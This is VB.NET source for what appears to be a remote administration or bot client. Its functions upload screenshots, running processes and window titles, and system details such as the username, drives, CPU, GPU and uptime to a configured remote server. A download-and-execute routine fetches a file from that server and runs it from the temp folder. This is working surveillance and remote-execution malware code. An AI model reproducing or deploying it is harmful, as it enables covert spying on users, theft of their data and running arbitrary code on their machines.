Imports System.IO
Imports System.Net
Imports System.Management

Module IndependantActions
    Private Declare Function GetTickCount& Lib "kernel32" () ' System Uptime
    Public Sub TakeScreenshot(fileName As String, ByRef mainWebClient As WebClient)
        Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
        Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
        mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + fileName, bmpBytes)
    End Sub

    Public Sub OpenURL(url As String)
        Try
            Process.Start(url)
        Catch ex As System.ComponentModel.Win32Exception
            Exit Sub
        End Try
    End Sub

    Public Sub UploadRunningTasks(ByRef mainWebClient As WebClient)
        ' System.Net.WebException : 'Le serveur distant a retourné une erreur : (414) Request-URI Too Long.'
        ' TODO : Find an alternative to send data without passing trought url
        Dim total As String
        For Each p As Process In Process.GetProcesses
            total += "{""processid"":""" & p.Id & ""","
            total += """processname"":""" & p.ProcessName & ""","
            total += """windowname"":""" & p.MainWindowTitle & ""","
            total += """processram"":""" & (p.WorkingSet64 / 1024) / 1024 & """}[;;]" & Environment.NewLine
        Next
        MsgBox(total)
        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
    End Sub

    Public Sub DownloadExecute(fileName As String)
        Dim downloadedBytes As Byte() =
            New WebClient().DownloadData(My.Settings.vpsurl & "files/" & fileName)

        File.WriteAllBytes(Path.GetTempPath & fileName, downloadedBytes)
        Process.Start(Path.GetTempPath & fileName)
    End Sub

    Public Sub GetStatistics(ByRef mainWebClient As WebClient)
        Dim query As New SelectQuery("Win32_VideoController")
        Dim search As New ManagementObjectSearcher(query)

        Dim cpu As String = "", gpu As String = "", hddList As String = ""
        Dim architecture As String = "32 Bits"

        For Each d In DriveInfo.GetDrives()
            hddList &= d.Name & ": " & d.VolumeLabel & "; "
        Next

        ' TODO: Not sure if whether or not we should use a loop,
        ' if it's only to set the variables to the last value of the iterated array. |
        '                                                                            V

        For Each g In search.Get()
            gpu = g("Caption").ToString
        Next

        For Each c In GetObject("WinMgmts:").InstancesOf("Win32_Processor")
            cpu = c.Name.ToString + " " + c.CurrentClockSpeed.ToString + " Mhz"
        Next


        If Environment.Is64BitOperatingSystem Then architecture = "64 Bits"

        ' TODO: Where is `architecture` ??
        Dim queryData As String =
            My.Settings.vpsurl & "|" &
            My.Settings.stats_total_initialisation & "|" &
            My.Settings.stats_total_instruction & "|" &
            My.Settings.stats_total_uptime & "|" &
            Environment.UserName & "|" & ' PC name
            GetTickCount / 1000 & "|" &  ' PC up-time
            hddList & "|" &
            My.Computer.Screen.Bounds.ToString & "|" & ' Screen Resolution
            cpu & "|" &
            gpu

        Dim queryResult As String =
            New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=sendstatistics&actioncontent=" & queryData)
    End Sub
End Module
